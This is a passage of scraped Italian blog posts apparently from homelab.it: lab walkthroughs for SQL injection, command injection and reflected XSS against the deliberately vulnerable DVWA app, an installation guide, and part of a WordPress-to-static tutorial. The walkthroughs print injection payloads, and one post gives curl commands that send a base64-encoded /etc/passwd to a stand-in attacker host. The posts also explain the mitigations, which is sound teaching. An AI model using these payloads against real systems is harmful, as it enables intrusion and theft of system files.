attacco False\nOttimo! Ricevendo un errore ho la conferma che il payload utilizzato è quello giusto.\nDVWA SQL Injection 12 – Injection Medium Level con errore\nControlliamo il sorgente:\nDVWA SQL Injection – Sorgente Medium Level\nIn questo livello la variabile id viene filtrata tramite la funzione php mysql-real-escape-string() :\n // Get input $id = $_POST[ \u0026#39;id\u0026#39; ]; $id = mysql_real_escape_string( $id ); Tale funzione inserisce il carattere backslashes davanti ai seguenti caratteri \\x00, \\n, \\r, \\, ‘, “ e \\x1a ma in questo caso è inutile perchè la variabile della query non è racchiusa tra apici o virgolette:\n $getid = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = $id;\u0026#34;; La query iniettata risulterebbe così:\n $getid = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = 1 and 1=1;\u0026#34; DVWA SQL Injection Blind – High Level Nel livello più alto vulnerabile ho deciso di utilizzare il plugin di firefox Tamper Data per manipolare le richieste.\nPotevo continuare ad utilizzare Burp Suite ma così colgo l’occasione di mostrare un eventuale alternativa.\nPer riprodurre il flusso dell’applicazione fondamentalmente si deve cliccare sul link “Click here to change your ID” (fig 13), poi inserire il numero id nella finestra pop-up (fig 14-15), infine leggere la risposta sulla pagina (fig 16).\nDVWA SQL Injection 13 – Injection High Level\nDVWA SQL Injection 14 – Injection High Level\nDVWA SQL Injection 15 – Injection High Level\nDVWA SQL Injection 16 – Injection High Level\nCome sui può notare negli screenshots precedenti l’applicativo ci suggerisce che l’id sarà passato tramite i Cookie.\nPer modificare la richieste è necessario attivare il plugin sul browser:\nDVWA SQL Injection 17 – Injection High Level\nRiproduco il flusso precedente, e dopo aver inserito un numero nella finestra pop-up premo il pulsante “Tamper“:\nDVWA SQL Injection 18 – Injection High Level\nA questo punto ho cominciato a cercare il payload giusto iniettandolo nel Cookie…:\nDVWA SQL Injection 19 – Injection High Level\n…fino a quando non ho trovato “1′ and 1=1 #” che non mi ha restituito alcun errore:\nDVWA SQL Injection 20 – Injection High Level\nSQL Injection trovata!\nDiamo uno sguardo al sorgente:\nDVWA SQL Injection 21 – Injection High Level\nCome si può notare la variabile $id non è filtrata:\n// Get input $id = $COOKIE[ \u0026#39;id\u0026#39; ]; DVWA SQL Injection Blind – Impossible Level (mitigazione) DVWA SQL Injection 22 – Injection High Level\nPer prima cosa viene controllato se la variabile id è a tutti gli effetti solo un numero, dopo di che la query viene eseguita con le prepared statements:\n // Was a number entered? if(is_numeric( $id )) { // Check the database $data = $db-\u0026gt;prepare( \u0026#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;\u0026#39; ); $data-\u0026gt;bindParam( \u0026#39;:id\u0026#39;, $id, PDO::PARAM_INT ); $data-\u0026gt;execute(); Le prepared statments sono fondamentali contro gli attacchi sql injection e ci vengono incontro nel caso in cui dovessimo scordarci di filtrare i dati input.\nSe sieste sviluppatori vi raccomando di approfondire l’argomento.\nDVWA SQL Injection (No Blind) Low, Medium, High + XSS Bonus A mio parere questa vulnerabilità non merita una write-up a parte perchè gli applicativi e i metodi di exploit sono praticamente identici.\nL’unica differenza è che in caso di SQL Injection individuata, l’applicazione risponde con un bel errore MySQL a video.\nUna cosa divertente che ci tengo a mostrare è la vulnerabilità XSS presente in tutti e tre i livelli:\nDVWA SQL Injection 23 – XSS Low Level\nDVWA SQL Injection 24 – XSS Medium Level\nDVWA SQL Injection 24 – XSS High Level\nAnche per oggi è tutto, e prometto che la prossima volta cercherò di essere più coinciso!\nByEeeE\n","permalink":"https://www.homelab.it/index.php/2016/01/14/dvwa-sql-injection/","summary":"Ciao a tutti, la write-up di oggi riguarderà la vulnerabilità DVWA SQL Injection.\nI requisiti sono:\n Conoscenze minime MySQL Qualsiasi Browser Proxy tipo Burpsuite e Zap o browser plugin tipo Tamper Data  L’app DVWA propone due tipi di vulnerabilità, SQL Injection, e SQL Injection Blind.\nInizierò subito con la vulnerabilità SQL Injection Blind dato che è la più complicata e divertente da scovare.\nIl risultato di un attacco SQL Injection nei migliori dei casi restituirà il classico messaggio:","title":"DVWA SQL injection + SQL Injection Blind + Bonus XSS"},{"content":"DVWA Command Injection – Soluzione Completa Bentornati, o benarrivati, nel post di oggi troverete la risoluzione della vulnerabilità: DVWA Command Injection, i requisiti sono:\n Qualsiasi browser disponibile Minima conoscenza di Linux, in particolare l’abilità nell’eseguire comandi multipli.  L’obbiettivo del test è quello di eseguire comandi arbitrari sul sistema operativo che ospita l’applicativo.\nIl target è una semplice paginetta composta da un form nella quale viene richiesto di inserire un indirizzo ip da pingare.\nLa richiesta avviene tramite metodo POST e la variabile da attaccare ha come nome “ip“.\nDVWA Command Injection – Low Level Come per le altre vulnerabilità il livello basso non ha alcun tipo di filtro, quindi mi aspetto di poter concatenare comandi di sistema subito dopo aver inserito l’indirizzo ip.\nNel mio caso l’applicazione è installata su un sistema linux ed utilizzerò i caratteri “; \u0026amp; |” come payloads (virgolette escluse).\nPer avere maggiori informazioni su questo tipo di attacco potete far riferimento ai seguenti links:\n https://www.owasp.org/index.php/Command_Injection http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution Concatenazione comandi Windows Concatenazione comandi Linux  Osservando il risultato della richiesta (primo screenshot ad inizio articolo) è possibile teorizzare che la pagina php utilizzi una funzione tipo system() o shell_exec() per eseguire il comando ping del sistema operativo.\nCome primo carattere ho deciso di utilizzare il punto e virgola “;” così da poter concatenare un comando (pwd) anche nel caso in cui il ping fallisse.\nPyload completo “10.0.0.1 ; pwd“:\nGuardando l’output della pagina si può vedere come lo script php abbia eseguito prima il ping verso l’ip 10.0.0.1 e poi stampato il risultato del comando pwd.\nPer avvalorare ciò che ho scritto poco fa, mostro come in effetti il carattere “;” concateni il comando pwd anche nel caso in cui fallisca il ping.\nPayload “questo_host_non_esiste ; pwd“:\nIl ping non ha prodotto nessun risultato dato che non sarà riuscito a risolvere l’host “questo_host_non_esiste” ma nel compenso ha eseguito il comando pwd.\nDiamo un’occhiata al sorgente php della pagina:\nNon esiste alcun filtro in input:\n if( isset( $_POST[ \u0026#39;Submit\u0026#39; ] ) ) { // Get input $target = $_REQUEST[ \u0026#39;ip\u0026#39; ]; Il comando ping viene eseguita tramite la funzione shell_exec():\n // Determine OS and execute the ping command. if( stristr( php_uname( \u0026#39;s\u0026#39; ), \u0026#39;Windows NT\u0026#39; ) ) { // Windows $cmd = shell_exec( \u0026#39;ping \u0026#39; . $target ); } else { // *nix $cmd = shell_exec( \u0026#39;ping -c 4 \u0026#39; . $target ); } Quindi il payload viene eseguito in questo modo:\n // *nix $cmd = shell_exec( \u0026#39;ping -c 4 10.0.0.1 ; pwd\u0026#39; ); ## DVWA Command Injection – Medium Level\nNel livello medio la concatenazione tramite il carattere “;” non funziona, sfortunatamente anche i caratteri “\u0026amp;\u0026amp;” sembrano essere filtrati.\nIl doppio carattere “e commerciale” può essere comparato all’operatore AND, nella concatenazione la sua condizione viene soddisfatta solo nel caso in cui il comando precedente non restituisce un errore (standard error).\nFallito il primo tentativo “10.0.0.1 \u0026amp;\u0026amp; pwd“, ho pensato ad altri 3 payloads:\n “questo_host_non_esiste | pwd” – Con il carattere pipe inoltro l’uotput del primo comando (ping) verso il secondo (pwd) “questo_host_non_esiste || ls” – Utilizzo il doppio carattere pipe come operatore OR per concatenare i comandi “questo_host_non_esiste \u0026amp; pwd” – Utilizzo il carattere “e commericale” per mandare in background il ping ed eseguire ifconfig  BINGO, BINGO, BINGO tutti e tre gli attacchi sono andati a buon fine trascurando l’esito del ping!\nNel sorgente php della pagina mi aspetto di trovare un filtro che elimina i caratteri “;” e “\u0026amp;\u0026amp;“:\nCome constatato dai test tramite la funzione php str_replace vengono rimossi i caratteri “;” e “\u0026amp;\u0026amp;” inseriti in una sorta di blacklist:\n .... // Set blacklist $substitutions = array( \u0026#39;\u0026amp;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); ... ## DVWA Command Injection – High Level\nDevo essere sincero, questo livello mi ha fatto imprecare più del dovuto…tutti i payloads provati in precedenza non mi hanno portato a niente.\nPreso un po dalla disperazione ho cominciato a concatenare i comandi senza gli spazi:\n “10.0.0.1\u0026amp;pwd” FAIL “10.0.0.1\u0026amp;\u0026amp;pwd” FAIL “10.0.0.1;pwd” FAIL “10.0.0.1|pwd” OWNED “10.0.0.1||pwd” FAIL  Che cul….ehm fortuna!\nDiamo un’occhiata al codice sorgente php:\nL’errore nella blacklist risiede nella gestione del carattere pipe:\n // Set blacklist $substitutions = array( \u0026#39;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;| \u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;-\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;$\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;(\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;)\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;`\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;||\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); Nell’array soprastante è possibile notare come il carattere singolo pipe abbia accanto uno spazio vuoto, quindi concatenandoci un comando attaccato il controllo verrà raggirato.\nVi state chiedendo perché altri vettori di attacco tipo “$ ( `” sono presenti nella blacklist?\nBeh la risposta meriterebbe un articolo a parte, nel frattempo cercherò di essere il più breve e chiaro possibile:\nBlind Command Injection, ovvero pagine vulnerabili all’attacco command injection con la differenza che a video non restituiscono alcun risultato ( da qui Blind, Cieco).\nPoniamo il caso in cui la pagina Command Injection di DVWA livello low non restituisse a video alcun risultato particolare, cosa succederebbe se usassimo i seguenti payloads?:\n\u0026ldquo;10.0.0.1 | curl http://hostname_serverweb_attaccante.com/$(base64 -w0 /etc/passwd)\u0026rdquo;\n\u0026ldquo;10.0.0.1 | curl http://hostname_serverweb_attaccante.com/`base64 -w0 /etc/passwd`\u0026rdquo;\nAndando a vedere gli error log del nostro server “hostname_server_web_attaccante.com” troveremmo una riga contenute il file passwd del server vulnerabile, codificato in base64!\nDVWA Command Injection – Impossible Level (Mitigazione) Nel livello impossibile, per impedire di iniettare caratteri particolari, viene controllato se l’output è formato solo da un raggruppamento di quattro numeri separati da zeri:\n // Split the IP into 4 octects $octet = explode( \u0026#34;.\u0026#34;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[1] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[2] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[3] ) ) \u0026amp;\u0026amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int\u0026#39;s put the IP back together. $target = $octet[0] . \u0026#39;.\u0026#39; . $octet[1] . \u0026#39;.\u0026#39; . $octet[2] . \u0026#39;.\u0026#39; . $octet[3]; Da notare anche la funzione anti-CSRF ad inizio scrupt:\n if( isset( $_POST[ \u0026#39;Submit\u0026#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ \u0026#39;user_token\u0026#39; ], $_SESSION[ \u0026#39;session_token\u0026#39; ], \u0026#39;index.php\u0026#39; ); Questa mitigazione contro la vulnerabilità command injection è strettamente legata a se stessa, per un discorso più globale vi rimando al mio vecchio articolo “Filtri command injection: escapeshellarg escapeshellcmd“.\nAnche per oggi è tutto, l’articolo DVWA Command Injection è conluso, un saluto e alla prossima vulnerabilità!\n","permalink":"https://www.homelab.it/index.php/2016/01/07/dvwa-command-injection-soluzione-completa/","summary":"DVWA Command Injection – Soluzione Completa Bentornati, o benarrivati, nel post di oggi troverete la risoluzione della vulnerabilità: DVWA Command Injection, i requisiti sono:\n Qualsiasi browser disponibile Minima conoscenza di Linux, in particolare l’abilità nell’eseguire comandi multipli.  L’obbiettivo del test è quello di eseguire comandi arbitrari sul sistema operativo che ospita l’applicativo.\nIl target è una semplice paginetta composta da un form nella quale viene richiesto di inserire un indirizzo ip da pingare.","title":"DVWA Command Injection – Soluzione Completa"},{"content":"Eccoci alla risoluzione della prima vulnerabilità che ho affrontato DVWA XSS Reflected, i requisiti per affrontare questo test sono:\n Browser senza filtri XSS, consiglio Mozilla **Firefox\n**  L’obbiettivo di questo test è iniettare del codice javascript all’interno di una pagina web che stampa a video caratteri passati tramite un form.\nLa richiesta avviene tramite metodo GET e la variabile target si chiama “name“.\nAnalizzando il sorgente html si può notare come il valore da me inviato (homelab) venga stampato a video tra i tag \nDVWA XSS Reflected – Low Level Nel livello più basso mi aspettavo di trovare un minimo di filtro o accortezza invece non esiste alcun tipo di controllo.\nPer cominciare ho inserito il classico payload “alert(1)” ed infatti ha funzionato subito:\nAnalizzando il codice sorgente si può notare come non ci sia alcun controllo in input sulla variabile $_GET[‘__name’]:\nDVWA XSS Reflected – Medium Level Anche in questo caso ho provato ad inserire il payload”alert(1)” per vedere il comportamento di un eventuale filtro:\nSi può notare la rimozione automatica del tag , come una sorta di blacklist.\nSpesso capita di imbattersi in filtri non propriamente efficienti, come ad esempio la mancanza di controlli case-sensitive.\nIniettando i tag “” alternando lettere minuscole a quelle maiuscole il filtro verrà bypassato:\nNel codice sorgente si può vedere come viene utilizzata, in maniera inadatta, la funzione php str_replace per eliminare la presenza della parola  dalla variabile $_GET[‘name’] :\nDVWA XSS Reflected – High Level Come da prassi inserisco il precedente payload per vedere l’effetto del nuovo filtro XSS:\nIl risultato è interessante, sembra che venga eliminata la parola case-sensitive script e tutto ciò che la precede, quindi sarà necessario evitare tag  o attributi con la parola javascript.\nPremetto che prima di scegliere un payload mi sono accertato che i caratteri \u0026lt; e \u0026gt; venissero accettati.\nTags html in cui è possibile inserire attributi javascript sono moltissimi, come ad esempio  , nello specifico “”\nIl codice sorgente mostra la regexp passata alla funzione php preg_replace che rimuove qualsiasi carattere case-sensitive di una stringa che comincia col simbolo minore “\u0026lt;” e che precede le lettere s,c,r,i,p,t.\nNaturalmente anche questo tipo di protezione è errata!\nDVWA XSS Reflected – Impossible Level (Mitigazione) Questo livello non può essere exploitato ma consultando il sorgente è possibile capire una delle tecniche da attuare per evitare di scrivere codice vulnerabile.\nLo scopo di questo test era quello di rompere o comunque modificare i tag html  ed inserirci del codice javascript.\nPer evitare tutto ciò, in questo livello l’input è stato filtrato dalla funzione php htmlspecialchars che semplicemente converte i caratteri speciali (tra cui \u0026lt; e \u0026gt; ) in entità html.\nUn’alternativa poteva essere anche la seguente:\n $bad_chars = array(\u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;); $safe_chars = array(\u0026#34;\u0026amp;lt;\u0026#34;, \u0026#34;\u0026amp;gt;\u0026#34;); $name = str_replace($bad_chars, $safe_chars, $_GET[ \u0026#39;name\u0026#39; ]); return stripslashes($name); Nel precedente filtro tramite str_replace non faccio altro che emulare la funzione htmlspecialchars, ovvero trasformo i caratteri speciali \u0026lt; e \u0026gt; nelle corrispettive entità html \u0026lt; e \u0026gt; .\nNaturalmente queste tecniche non possono essere utilizzate in tutti i casi, ad esempio se dovessimo filtrare l’attributo di un tag o sarebbe inutile filtrare solo i caratteri speciali.\nOltre al filtro XSS è presente anche una funzione checkToken() utilizzata per evitare attacchi CSRF.\n","permalink":"https://www.homelab.it/index.php/2016/01/02/dvwa-xss-reflected-soluzione-completa/","summary":"Eccoci alla risoluzione della prima vulnerabilità che ho affrontato DVWA XSS Reflected, i requisiti per affrontare questo test sono:\n Browser senza filtri XSS, consiglio Mozilla **Firefox\n**  L’obbiettivo di questo test è iniettare del codice javascript all’interno di una pagina web che stampa a video caratteri passati tramite un form.\nLa richiesta avviene tramite metodo GET e la variabile target si chiama “name“.\nAnalizzando il sorgente html si può notare come il valore da me inviato (homelab) venga stampato a video tra i tag","title":"DVWA XSS Reflected – Soluzione Completa"},{"content":"Avete voglia di testate le vostre conoscenze o skills di penetration testing per quanto riguardo il campo web applicativo senza problemi legali?\nAvete voglia di conoscere le possibili mitigation da attuare contro le maggiori vulnerabilità?\nBene! Damn Vulnerable Web Application fa proprio al caso vostro!\nDVWA è una web application scritta in PHP e MySQL installabile in qualsiasi ambiente in cui sia presente un web server, php e mysql.\nL’applicazione è stata creata e concepita piena zeppa di vulnerabilità più o meno facili da scovare, il livello di difficoltà può essere configurato come:\n Basso – Non esiste nessun tipo di controllo di sicurezza Medio – Controlli approssimativi Alto – Questo è il livello più alto e l’obbiettivo non si deve sempre focalizzare soltanto sulla vulnerabilità stessa (stile CTF) Impossibile – Non sono presenti vulnerabilità. Questo livello è stato creato per mostrare agli sviluppatori come mitigare le vulnerabilità.  Le vulnerabilità con cui è possibile confrontarsi sono le seguenti:\n Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPTCHA Sql Injection Sql Injection (Blind) XSS Reflected XSS Stored  Questo sarà uno dei vari post che scriverò sull’applicazione DVWA, dall’installazione alla risoluzione delle varie vulnerabilità.\nInstallazione Damn Vulnerable Web Application Per l’installazione farò riferimento al sistema operativo Linux CentOS 6 ma a grandi linee potete prenderla come riferimento per altre distribuzioni.\nConsiglio di virtualizzare l’ambiente di lavoro, in ogni caso l’importante è che non installiate l’applicativo su un server web pubblico se non volete rischiare di essere bucati.\nNel mio esempio darò per scontato di avere già una macchina virtuale CentOS 6 con indirizzo ip 10.0.0.100, web server apache e database mysql.\n Si parte con l’installazione dei requisiti:  [root@web ~]# yum install httpd mysql-server mysql php php-mysql php-gd php-common php-pdo php-cli unzip Avviare i servizi web e database:  [root@web ~]# /etc/init.d/httpd start \u0026amp;\u0026amp; /etc/init.d/mysqld start Scaricare l’ultima versione di DVWA (1.9 al momento) nella DocumentRoot di apache:  [root@web ~]# cd /var/www/html/ [root@web html]# wget https://github.com/RandomStorm/DVWA/archive/v1.9.zip [root@web html]# unzip v1.9.zip [root@web html]# mv DVWA-1.9/ DVWA \u0026amp;\u0026amp; chown apache.apache DVWA -R Con un qualsiasi client mysql, creare le credenziali di accesso e il database per l’applicazione:  create database dvwa; CREATE USER \u0026#39;dvwauser\u0026#39;@\u0026#39;127.0.0.1\u0026#39; IDENTIFIED BY \u0026#39;password\u0026#39;; grant all on dvwa.* to \u0026#39;dvwauser\u0026#39;@\u0026#39;127.0.0.1\u0026#39;; flush privileges;  Registrarsi sul sito https://www.google.com/recaptcha/intro/index.html per ricevere la chiave pubblica e privata da configurare su DVWA così da potersi cimentare con il test “Insecure CAPTCHA“.\n  Editare il file DVWA/config/config.inc.php inserendo il nome, l’username e la password del database (righe 11-18):\n   11 # Database variables_ 12 # WARNING: The database specified under db_database WILL BE ENTIRELY DELETED during setup. 13 # Please use a database dedicated to DVWA. 14 $_DVWA = array(); 15 $_DVWA[ \u0026#39;db_server\u0026#39; ] = \u0026#39;127.0.0.1\u0026#39;; 16 $_DVWA[ \u0026#39;db_database\u0026#39; ] = \u0026#39;dvwa\u0026#39;; 17 $_DVWA[ \u0026#39;db_user\u0026#39; ] = \u0026#39;dvwauser\u0026#39;; 18 $_DVWA[ \u0026#39;db_password\u0026#39; ] = \u0026#39;password\u0026#39;; e la chiave pubblica/privata per il captcha (righe 23-27):\n 23 # ReCAPTCHA settings_ 24 # Used for the \u0026#39;Insecure CAPTCHA\u0026#39; module_ 25 # You\u0026#39;ll need to generate your own keys at: https://www.google.com/recaptcha/admin/create_ 26 $_DVWA[ \u0026#39;recaptcha_public_key\u0026#39; ] = \u0026#39;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8......\u0026#39;; 27 $_DVWA[ \u0026#39;recaptcha_private_key\u0026#39; ] = \u0026#39;6LdK7xITAzzAAL_uw9YXVUOPoIHPZ.......\u0026#39;; Editare il file /etc/php.ini ed abilitare la funzione php allow_url_include:  ; Whether to allow the treatment of URLs (like http:// or ftp://) as files. ; http://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen allow_url_fopen = On ; Whether to allow include/require to open URLs (like http:// or ftp://) as files. ; http://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include allow_url_include = On Riavviare il servizio apache:  [root@web ~]# /etc/init.d/httpd restart Collegarsi all’home page dell’applicativo (http://10.0.0.100/DVWA/) e risolvere eventuali requisiti segnalati, dopo di che premere il bottone “Create/Reset Database“:  Se tutto è andato a buon fine verrete rimandati automaticamente alla pagina di login, altrimenti ricontrollate i dati riguardanti il database. Per autenticarsi le credenziali di default sono username admin e password password:  Una volta autenticati è possibile modificare il livello di difficoltà cliccando sul menù “DVWA Security” a sinistra:  Bene, arrivati a questo punto Damn Vulnerable Web Application è pronta per affrontare le nostre skills.\nSe volete qualche consiglio vi suggerisco di utilizzare nella vostra analisi tools come Burpsuite, Owasp Zap, il plugin Firefox Tamper Data, tanta pazienza e la madre di tutti i tools: il vostro cervello 😀\nInoltre se siete dei principianti è raccomandato partire dal livello basso e leggere i links di riferimento che troverete infondo alla pagina di ogni vulnerabilità.\nUna volta completati tutti e tre i gradi di difficoltà di una singola vulnerabilità, date un’occhiata al relativo sorgente presente nel livello “Impossibile” così da imparare anche le possibili mitigazioni.\nNon mi resta che augurarvi: Happy Hacking!\n","permalink":"https://www.homelab.it/index.php/2015/12/24/dvwa-damn-vulnerable-web-application/","summary":"Avete voglia di testate le vostre conoscenze o skills di penetration testing per quanto riguardo il campo web applicativo senza problemi legali?\nAvete voglia di conoscere le possibili mitigation da attuare contro le maggiori vulnerabilità?\nBene! Damn Vulnerable Web Application fa proprio al caso vostro!\nDVWA è una web application scritta in PHP e MySQL installabile in qualsiasi ambiente in cui sia presente un web server, php e mysql.\nL’applicazione è stata creata e concepita piena zeppa di vulnerabilità più o meno facili da scovare, il livello di difficoltà può essere configurato come:","title":"DVWA – Damn Vulnerable Web Application"},{"content":"Sorgente immagine: https://greggbanse.com/\nIntroduzione Alzi la mano chi non ha storto il naso leggendo il titolo di questo articolo?\nSicuramente moltissimi ed è stata la mia stessa reazione quando mi sono imbattuto in un post dal titolo The Unhackable WordPress Blog scritto da Matthew Bryant (mandatory).\nIncuriosito dal titolo, volutamente provocatorio, ho continuato la lettura fino alla fine e sono rimasto molto entusiasta, in pratica il buon Matthew Bryant espone la sua teoria che si basa sul trovare un alto livello di sicurezza convertendo da dinamico a statico il CMS WordPress (e non solo).\nRifletteteci bene: senza più sessioni, senza più database, senza più pensare ai plugins di terze parti fatti con i piedi, senza le notti insonni con l’incubo dell’ennesimo 0day di wordpress.\nStaticizzando wordpress non penseremmo più a vulnerabilità tipo CSRF, SQL Injection, RCE, XSS, in quest’ultimo caso non del tutto ma almeno ai Cross-Site Scripting che potrebbero provocare l’upload di una webshell o la perdita incontrollata delle sessioni.\nOltre a queste vulnerabilità mi vengono in mente altri tipi di attacchi mirati ad impossessarsi delle credenziali che possono essere evitati, tipo: Phishing, BruteForce, Man in the Middle.\nL’idea di Matthew è semplicissima, ovvero la possibilità di lavorare in locale sul proprio blog wordpress, convertirlo in statico, sistemare qua e là qualche link ed infine caricarlo online nell’area web fornita dal provider.\nAlla fine della fiera il problema della sicurezza si focalizzerebbe più che altro sulle credenziali di accesso ai servizi del provider (ftp, sftp, http, ecc..), sulle credenziali di accesso del dominio, data breach o hacking del proprio provider/gestore di dominio e DOS/DDOS.\nPurtroppo l’articolo “The Unhackable WordPress Blog” è più teorico che pratico quindi pronti via, seguendo le poche istruzioni, il mio test ha fallito miseramente.\nDopo svariate ore di imprecazioni, prove e scripting sono arrivato ad un risultato discreto che troverete passo dopo passo qui di seguito, compreso un simpatico bash script che automatizzerà tutto il processo.\n Premessa Rendere statico wordpress in alcuni casi non è una buona idea, se non impossibile. Quali? In tutti i casi in cui l\u0026rsquo;utente finale deve interagire con i dati contenuti nel database o nel filesystem, come per esempio uno shop online, live score, uploader di files. Se il tuo sito rientra tra queste categorie puoi anche interrompere la lettura, ma se sei curioso e vuoi imparare qualcosa di nuovo allora prosegui pure.\n Finalmente la pratica La procedura che riporterò di seguito è stata effettuata su sistema operativo Linux, quindi per i “Windowsiani” mi spiace ma dovrete trovare tools e batch/script alternativi a quelli che ho utilizzato.\nFase 1 – Preparazione dell’ambiente Come prima cosa mi sono creato una macchina virtuale nel mio disco esterno criptato, replicando lo stesso OS e la stessa configurazione del server web in cui risiede il mio blog wordpress, dopo di che ho importato i files e il database del sito.\nIn questo modo tutta la parte di back-end da adesso in poi verrà gestita soltanto il locale, dalla scrittura degli articoli all’amministrazione del cms.\nNaturalmente voi potete installare il tutto anche sulla vostra macchina locale, un server in lan, in dmz, insomma l’importante è che il cms non sia raggiungibile pubblicamente da tutti.\nUna volta creato l’ambiente di lavoro il passo successivo è modificare il file /etc/hosts in modo da fare puntare il dominio del proprio cms verso la macchina locale.\nNel mio caso l’url del blog è www.homelab.it e l’ip della macchina virtuale 10.0.0.70:\nclaudio@KaliCla:~$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 KaliCla 10.0.0.70 www.homelab.it homelab.it claudio@KaliCla:~$ Eseguendo un ping è possibile capire se il dominio vine risolto in maniera corretta:\nclaudio@KaliCla:~$ ping www.homelab.it PING www.homelab.it (10.0.0.70) 56(84) bytes of data. 64 bytes from www.homelab.it (10.0.0.70): icmp_seq=1 ttl=64 time=0.481 ms 64 bytes from www.homelab.it (10.0.0.70): icmp_seq=2 ttl=64 time=0.297 ms 64 bytes from www.homelab.it (10.0.0.70): icmp_seq=3 ttl=64 time=0.361 ms ^C --- www.homelab.it ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 1999ms rtt min/avg/max/mdev = 0.297/0.379/0.481/0.079 ms claudio@KaliCla:~$ Fase 2 – Individuazione alternativa statica a funzioni e plugins dinamici Come anticipato nell’introduzione dell’articolo il problema nel rendere statico wordpress è la perdita delle proprietà dinamiche, come la possibilità di cercare post o lasciare commenti sul blog.\nPer ovviare a queste due mancanze ho cercato due alternative esterne al cms, per i commenti ho utilizzato un plugin che si poggia alla famosa piattaforma DISQUS mentre per il sistema di ricerca ho optato per il Google Custom Search Engine (CSE).\nPer installare il CSE di Google basta iscriversi sul sito e copiarsi il codice javascript che verrà generato automaticamente, ad esempio:\n\u0026lt;script\u0026gt; (function() { var cx = \u0026#39;015793309105085050902:hsska5lc-e8\u0026#39;; var gcse = document.createElement(\u0026#39;script\u0026#39;); gcse.type = \u0026#39;text/javascript\u0026#39;; gcse.async = true; gcse.src = (document.location.protocol == \u0026#39;https:\u0026#39; ? \u0026#39;https:\u0026#39; : \u0026#39;http:\u0026#39;) + \u0026#39;//cse.google.com/cse.js?cx=\u0026#39; + cx; var s = document.getElementsByTagName(\u0026#39;script\u0026#39;)[0]; s.parentNode.insertBefore(gcse, s); })(); \u0026lt;/script\u0026gt; \u0026lt;gcse:search\u0026gt;\u0026lt;/gcse:search\u0026gt; Copiato il codice è necessario creare un Widget “Testo” nel quale poi dovrà essere incollato il codice javascript.\nIl risultato lo potete vedere sulla colonna di destra del mio blog (o in fondo se utilizzate dispositivi mobile).\nUn ulteriore vantaggio di questa barra di ricerca è che più persone ne usufruiranno e più ne gioverà il vostro punteggio SEO.\nFase 3 – Download Front-end WordPress Per rendere statico wordpress ho creato uno script in bash che potete scaricare dal mio repository GITHUB:\n ___ ___ _______ | Y .-----. | _ .----.-----.--------. |. | | _ | |. 1___| _| _ | | |. / \\\\ | __| |. __) |__| |_____|__|__|__| |: |__| |: | |::.|:. | |::.| \\`--- ---\u0026#39; ______ \\`---\u0026#39; __ _______ | _ \\\\ .--.--.-----.---.-.--------|__.----. | | |. | \\\\| | | | _ | | | __| |___| | |. | |___ |__|__|___._|__|__|__|__|____| / ___/ |: 1 |_____| |: 1 \\\\ |::.. . / |::.. . | \\`------\u0026#39; \\`-------\u0026#39; _______ __ __ __ | _ | |_.---.-| |_|__.----. | 1___| _| _ | _| | __| |____ |____|___._|____|__|____| |: 1 | |::.. . | \\`-------\u0026#39; by Claudio Viviani https://www.homelab.it info [at] homelab.it Download: https://github.com/claudioviviani/wp_dynamic2static Se non avete intenzione o voglia di capire come funziona lo script potete anche passare alla sezione successiva dell’articolo, altrimenti continuate pure con la lettura.\nQuesta è la fase principale, ovvero scaricare l’intero blog lato front-end in modo da poterlo visualizzare anche in modalità off-line.\nPer questo scopo ho optato per il tool wget con la seguente sintassi:\nclaudio@KaliCla:~$ wget -m --html-extension --convert-links --domains homelab.it --no-parent https://www.homelab.it  -m modalità mirror, ovvero scarica recursivamente l’intero sito (pagine, css, js, ecc..). –html-exension scarica le pagine con l’estensione html. –convert-links converte i links in modo che funzionino anche in modalità off-line. –domanins durante lo scarico non segue nessun link al difuori del dominio specificato. –no-parent non segue i link al difuori della directory specificata nell’url  L’intero sito verrà scaricato in una directory il cui nome verrà ripreso dal dominio dell’url, nel mio caso “www.homelab.it”\nclaudio@KaliCla:~$ ls www.homelab.it/ index.html index.php robots.txt wp-content wp-includes claudio@KaliCla:~$ Scaricato l’intero sito è necessario occuparsi anche del feed RSS:\nclaudio@KaliCla:~$ wget -q https://www.homelab.it/index.php/feed/ -O www.homelab.it/index.php/feed/index.xml  -q quiet (no output) -O Salva la pagina scaricata col nome personalizzato  Adesso che tutto il materiale off-line è disponibile si può notare come alcuni file, tipo css e js, siano stati rinominati con il numero versione:\nwp-emoji-release.min.js?ver=4.3.1 /dazzling/style.css?ver=4.3.1 /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1\nInoltre all’interno delle pagine html i link che fanno riferimento a questi file presentano il carattere “?” convertito in urlencode “%3F”.\nPer rimediare a queste due problematiche ho deciso di affidarmi sempre a bash:\n# Rinomino tutti i files in maniera corretta (rimuovo numero versione dal nome 